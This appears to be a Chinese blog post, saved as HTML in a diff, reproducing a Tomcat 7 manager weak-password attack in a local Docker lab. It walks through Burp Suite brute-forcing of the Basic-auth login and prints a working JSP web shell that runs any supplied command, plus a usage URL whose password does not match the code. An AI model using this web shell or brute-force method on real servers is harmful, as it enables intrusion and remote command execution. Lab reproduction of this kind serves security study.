@@ -1,0 +1,743 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Franky">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="漏洞原理tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。 利用条件1、tomcat所有版本 准备阶段攻击机：192.168.129.128_window10 靶机 ：192.168">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat7+弱密码&amp;&amp;后端Getshell漏洞">
+<meta property="og:url" content="http://example.com/2022/05/08/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Franky&amp;blog">
+<meta property="og:description" content="漏洞原理tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。 利用条件1、tomcat所有版本 准备阶段攻击机：192.168.129.128_window10 靶机 ：192.168">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818154809280.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818130507238.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818130634750.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818130922937.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818131137054.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818131508992.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818133313901.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818133327878.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818133338417.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818133357998.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818135945044.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818134605079.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818154626194.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818141322866.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818141402755.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818151948255.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818152031725.png">
+<meta property="og:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818152255496.png">
+<meta property="article:published_time" content="2022-05-08T07:15:44.000Z">
+<meta property="article:modified_time" content="2024-02-24T19:52:49.520Z">
+<meta property="article:author" content="Franky">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:\blog2\source_posts\Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E.assets\image-20220818154809280.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞 - Franky&amp;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Franky</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Tomcat7+弱密码&amp;&amp;后端Getshell漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-05-08 15:15" pubdate>
+          2022年5月8日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          425 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          4 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>tomcat存在管理后台进行应用部署管理，且管理后台使用HTTP基础认证进行登录。若用户口令为弱口令，攻击者容易进行暴力破解登录后台并进行应用管理。登录成功后有上传点，上传压缩包 xxx.war的.war不会被解析，直接访问 xxx&#x2F;目录下的木马，拿到权限。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1、tomcat所有版本</p>
+<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>攻击机：192.168.129.128_window10</p>
+<p>靶机 ：192.168.129.130_kali</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h5><p>在靶机中使用docker搭建</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker-compose build <span class="hljs-comment">#进行编译</span><br><br>docker-compose up -d <span class="hljs-comment">#运行靶场</span><br><br>docker ps  <span class="hljs-comment">#查看容器</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154809280.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818154809280.png" srcset="/img/loading.gif" lazyload alt="image-20220818154809280"></a></p>
+<p>image-20220818154809280</p>
+<h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><p>访问<a target="_blank" rel="noopener" href="http://192.168.129.130:8080/">http://192.168.129.130:8080/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130507238.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818130507238.png" srcset="/img/loading.gif" lazyload alt="image-20220818130507238"></a></p>
+<p>image-20220818130507238</p>
+<p>进行登录</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130634750.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818130634750.png" srcset="/img/loading.gif" lazyload alt="image-20220818130634750"></a></p>
+<p>image-20220818130634750</p>
+<p>BurpSuitPro抓包</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818130922937.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818130922937.png" srcset="/img/loading.gif" lazyload alt="image-20220818130922937"></a></p>
+<p>image-20220818130922937</p>
+<p>发现账号密码格式为 base64(账号:密码)</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131137054.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818131137054.png" srcset="/img/loading.gif" lazyload alt="image-20220818131137054"></a></p>
+<p>image-20220818131137054</p>
+<p>发到测试器进行爆破</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818131508992.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818131508992.png" srcset="/img/loading.gif" lazyload alt="image-20220818131508992"></a></p>
+<p>image-20220818131508992</p>
+<p>选择自定义迭代器并导入用户名字典</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133313901.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133313901.png" srcset="/img/loading.gif" lazyload alt="image-20220818133313901"></a></p>
+<p>image-20220818133313901</p>
+<p>导入：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133327878.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133327878.png" srcset="/img/loading.gif" lazyload alt="image-20220818133327878"></a></p>
+<p>image-20220818133327878</p>
+<p>导入密码字典</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133338417.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133338417.png" srcset="/img/loading.gif" lazyload alt="image-20220818133338417"></a></p>
+<p>image-20220818133338417</p>
+<p>进行base64编码</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818133357998.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818133357998.png" srcset="/img/loading.gif" lazyload alt="image-20220818133357998"></a></p>
+<p>image-20220818133357998</p>
+<p>url编码这些字符不选</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818135945044.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818135945044.png" srcset="/img/loading.gif" lazyload alt="image-20220818135945044"></a></p>
+<p>image-20220818135945044</p>
+<p>设置线程，防止被封</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818134605079.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818134605079.png" srcset="/img/loading.gif" lazyload alt="image-20220818134605079"></a></p>
+<p>image-20220818134605079</p>
+<p>开始测试</p>
+<p>获得弱口令为tomcat:tomcat</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818154626194.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818154626194.png" srcset="/img/loading.gif" lazyload alt="image-20220818154626194"></a></p>
+<p>image-20220818154626194</p>
+<p>登录后台</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141322866.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818141322866.png" srcset="/img/loading.gif" lazyload alt="image-20220818141322866"></a></p>
+<p>image-20220818141322866</p>
+<p>找到上传点</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818141402755.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818141402755.png" srcset="/img/loading.gif" lazyload alt="image-20220818141402755"></a></p>
+<p>image-20220818141402755</p>
+<p>将jsp木马压缩成zip文件，然后将后缀改为war</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818151948255.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818151948255.png" srcset="/img/loading.gif" lazyload alt="image-20220818151948255"></a></p>
+<p>image-20220818151948255</p>
+<p>小马代码如下</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;%<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;sun&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;pass&quot;</span>)))&#123;<br>java.io.InputStream in = <span class="hljs-keyword">Runtime</span>.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];<br>out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)&#123;<br>out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));<br>&#125;<br>out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br>%&gt;<br><br>JSP<br></code></pre></td></tr></table></figure>
+
+<p>进行上传</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152031725.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818152031725.png" srcset="/img/loading.gif" lazyload alt="image-20220818152031725"></a></p>
+<p>image-20220818152031725</p>
+<p>成功上传，访问<a target="_blank" rel="noopener" href="http://192.168.129.130:8080/shell/shell.jsp?pass=666&cmd=pwd">http://192.168.129.130:8080/shell/shell.jsp?pass=666&amp;cmd=pwd</a></p>
+<p>（pass参数为密码，cmd参数为命令)</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/18/Tomcat7+%E5%BC%B1%E5%AF%86%E7%A0%81&&%E5%90%8E%E7%AB%AFGetshell%E6%BC%8F%E6%B4%9E/image-20220818152255496.png"><img src="D:\blog2\source_posts\Tomcat7+弱密码&&后端Getshell漏洞.assets\image-20220818152255496.png" srcset="/img/loading.gif" lazyload alt="image-20220818152255496"></a></p>
+<p>image-20220818152255496</p>
+<h5 id="关闭环境"><a href="#关闭环境" class="headerlink" title="关闭环境"></a>关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Tomcat7+弱密码&amp;&amp;后端Getshell漏洞</div>
+      <div>http://example.com/2022/05/08/Tomcat7+弱密码&amp;&amp;后端Getshell漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Franky</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年5月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/05/08/Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5(CVE-2021-44228)/" title="Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Apache Log4j2 查找功能 JNDI 注入(CVE-2021-44228)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="" target="_blank" rel="nofollow noopener"><span></span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Franky</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
